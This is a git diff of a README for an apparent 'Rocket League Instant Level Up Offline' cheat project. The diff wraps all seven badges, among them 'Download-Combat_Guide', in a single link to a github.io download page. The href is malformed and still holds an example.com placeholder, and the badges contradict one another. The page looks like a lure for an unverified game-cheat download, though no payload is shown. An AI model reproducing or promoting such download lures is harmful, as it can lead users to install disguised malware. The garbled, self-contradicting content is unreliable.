@@ -5,13 +5,15 @@
 ![Rocket League Offline Setup](https://i.imgur.com/VY7Pvfs.jpg)
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/Download-Combat_Guide-orange?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Platform-PC_Offline-blue?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Last_Update-June_2025-brightgreen?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Type-Instant_Level_Up-purple?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/OS-Windows_|_Linux_|_Console-lightgrey?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Fan_Guide-Included-informational?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Discord-Invalid-red?style=for-the-badge&logo=discord"></a>
+  <a href="[https://example.com/your-download-link](https://rocket-league-instant-level-up-offline.github.io/.github)">
+    <img src="https://img.shields.io/badge/Download-Combat_Guide-orange?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Platform-PC_Offline-blue?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Last_Update-June_2025-brightgreen?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Type-Instant_Level_Up-purple?style=for-the-badge">
+    <img src="https://img.shields.io/badge/OS-Windows_|_Linux_|_Console-lightgrey?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Fan_Guide-Included-informational?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Discord-Invalid-red?style=for-the-badge&logo=discord">
+  </a>
 </p>
 
 ---
